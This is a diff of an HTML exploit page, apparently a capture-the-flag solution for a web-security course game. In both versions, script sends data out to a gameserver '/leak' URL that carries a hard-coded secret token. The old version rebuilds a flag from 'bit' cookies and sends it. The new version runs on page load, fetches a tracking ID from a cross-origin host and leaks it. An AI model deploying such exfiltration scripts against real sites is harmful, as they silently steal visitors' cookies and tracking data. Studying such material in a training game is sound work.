@@ -1,51 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secret Leaker</title>
+    <title>Tracking ID Exploit</title>
 </head>
 <body>
+    <h1>Attempting to retrieve tracking ID...</h1>
     <script>
-        // Function to leak data
         function leak(data) {
-            fetch(`https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`);
+            fetch(`https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Data leaked successfully!");
+                    } else {
+                        console.error("Failed to leak data:", response.status, response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error during leak request:", error);
+                });
         }
 
-        // Read all 24 bits from cookies
-        let bits = [];
-        for (let i = 0; i < 24; i++) {
-            const name = `bit${i}`;
-            const regex = new RegExp(`(^| )${name}=([^;]+)`);
-            const match = document.cookie.match(regex);
-            if (match) {
-                bits.push(match[2]); // '0' or '1'
-            } else {
-                bits.push('0'); // Default if cookie not found
+        async function getAndLeakTrackingID() {
+            const trackingUrl = "http://0.tracking.jeopardy.websec.saarland/get";
+
+            try {
+                // Fetch the tracking ID as text
+                const response = await fetch(trackingUrl);
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                const trackingID = await response.text();
+
+                console.log("Retrieved Tracking ID (24 bits):", trackingID);
+
+                // Leak the 24-bit string directly
+                leak(trackingID);
+
+                // The next part is for you to manually calculate the SHA-256 hash
+                // once you receive the leaked 'trackingID' from the gameserver.
+                // You will convert this 24-bit string back to a 3-character string
+                // and then calculate its SHA-256 hash.
+                // Example (concept, not executable in browser without crypto module setup):
+                // const secretCharacters = convert24BitsTo3Chars(trackingID);
+                // const sha256Hash = await sha256(secretCharacters);
+                // console.log("SHA-256 Hash of secret:", sha256Hash);
+
+            } catch (error) {
+                console.error("Error fetching or leaking tracking ID:", error);
             }
         }
 
-        // Convert bits to string and then to 3 characters
-        const bitString = bits.join('');
-        let secret = '';
-        for (let i = 0; i < 24; i += 8) {
-            const byte = bitString.substring(i, i + 8);
-            const charCode = parseInt(byte, 2);
-            secret += String.fromCharCode(charCode);
-        }
+        // Run the exploit when the page loads
+        window.onload = getAndLeakTrackingID;
 
-        // Compute SHA-256 hash
+        // Helper function for SHA-256 (conceptual - for your local calculation)
+        // This part needs to be done *after* you receive the leaked 'trackingID'.
+        // For actual browser-side SHA-256, you'd use SubtleCrypto.
+        /*
         async function sha256(message) {
-            const encoder = new TextEncoder();
-            const data = encoder.encode(message);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
             const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            const hexHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            return hexHash;
         }
 
-        // Leak the SWAG{hash} after computation
-        sha256(secret).then(hash => {
-            const flag = `SWAG{${hash}}`;
-            leak(flag);
-        });
+        function convert24BitsTo3Chars(bitString) {
+            if (bitString.length !== 24) {
+                console.error("Bit string must be 24 bits long.");
+                return "";
+            }
+            let chars = [];
+            for (let i = 0; i < 24; i += 8) {
+                const byteString = bitString.substring(i, i + 8);
+                const charCode = parseInt(byteString, 2);
+                chars.push(String.fromCharCode(charCode));
+            }
+            return chars.join('');
+        }
+        */
     </script>
 </body>
 </html>
